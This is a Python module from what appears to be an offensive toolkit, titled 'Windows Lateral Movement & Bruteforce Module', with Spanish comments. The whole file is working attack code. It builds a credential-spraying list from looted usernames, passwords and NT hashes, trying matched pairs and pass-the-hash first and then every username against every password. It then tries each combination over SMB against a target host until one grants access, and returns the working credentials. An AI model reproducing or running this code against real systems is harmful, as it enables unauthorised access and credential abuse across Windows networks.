# modules/thor.py

BANNER = r"""
                  █████ █   █  ███  ████   
                   ░█░░░█░  █░█ ░░█ █░░░█  
                    █░░░█████░█░ ░█░████░░ 
                    █░░ █░░░█░█░░ █░█░░█░ ░
                    █░░ █░░░█░░███ ░█░░░█░ 
                     ░░  ░░  ░░ ░░░ ░░░  ░ 
                      ░   ░   ░  ░░░  ░   ░
          XX                                    XX
        XX..X                                  X..XX
      XX.....X                                X.....XX
 XXXXX.....XX                                  XX.....XXXXX
X |......XX%,.@                              @#%,XX......| X
X |.....X  @#%,.@                          @#%,.@  X.....| X
X  \...X     @#%,.@                      @#%,.@     X.../  X
 X# \.X        @#%,.@                  @#%,.@        X./  #
  ##  X          @#%,.@              @#%,.@          X   #
, "# #X            @#%,.@          @#%,.@            X ##
   `###X             @#%,.@      @#%,.@             ####'
  . ' ###              @#%.,@  @#%,.@              ###`"
    . ";"                @#%.@#%,.@                ;"` ' .
      '                    @#%,.@                   ,.
      ` ,                @#%,.@  @@                `
                          @@@  @@@                  .

    ---------------------------------------------------------
         Windows Lateral Movement & Bruteforce Module
                Author: Bruno Paniagua García
    ---------------------------------------------------------
"""

from utils import bifrost
from utils import ratatoskr as log

def _build_spray_list(credentials):
    """
    Construye los intentos ORDENADOS:
      1. Alta confianza: pares (usuario+secreto) y (usuario+hash NT) que
         venian juntos en la misma candidata.
      2. Cartesiano SOLO de contraseñas (usuario x secreto) como fallback.
    Los hashes NT NO se prueban en cartesiano: un hash pertenece a SU cuenta
    (PtH solo donde debe). Cada intento es un dict con secret XOR nt_hash.
    """
    usernames, secrets = [], []
    seen_u, seen_s = set(), set()
    high_confidence = []

    for c in credentials:
        if c.username and c.username not in seen_u:
            seen_u.add(c.username); usernames.append(c.username)
        if c.secret and c.secret not in seen_s:
            seen_s.add(c.secret); secrets.append(c.secret)
        if c.username and c.secret:
            high_confidence.append((c.username, c.secret, None))
        if c.username and c.nt_hash:
            high_confidence.append((c.username, None, c.nt_hash))

    attempts, seen = [], set()

    def _add(user, secret, nt_hash):
        key = (user, secret, nt_hash)
        if key not in seen:
            seen.add(key)
            attempts.append({"username": user, "secret": secret, "nt_hash": nt_hash})

    # 1. Alta confianza (contraseñas y hashes juntos con su cuenta).
    for user, secret, nt_hash in high_confidence:
        _add(user, secret, nt_hash)

    # 2. Cartesiano de contraseñas (fallback). Sin hashes.
    for user in usernames:
        for secret in secrets:
            _add(user, secret, None)

    return attempts


def lateral_move(credentials, target_ip, domain=None):
    """
    Movimiento lateral hacia target_ip probando contraseñas y hashes NT
    del botin, alta confianza primero. Por cada intento prueba los
    dominios candidatos. Se detiene en el primer acierto.
    """
    if not bifrost.is_reachable(target_ip):
        return {"status": "unreachable", "attempts": 0}
    
    attempts = _build_spray_list(credentials)
    domains = [domain] if domain is not None else bifrost.resolve_domains(target_ip)

    tries = 0
    for a in attempts:
        for dom in domains:
            tries += 1
            log.debug(f"thor: probando {a['username']} dom='{dom}' "
                      f"{'[hash]' if a['nt_hash'] else '[pass]'}")
            access = bifrost.smb_access(
                target_ip, a["username"],
                secret=a["secret"], domain=dom, nt_hash=a["nt_hash"],
            )
            if access is not None:
                return {
                    "status": "success",
                    "username": a["username"],
                    "secret": a["secret"],
                    "nt_hash": a["nt_hash"],
                    "domain": dom,
                    "access": access,
                    "attempts": tries,
                }

    return {"status": "failed", "attempts": tries}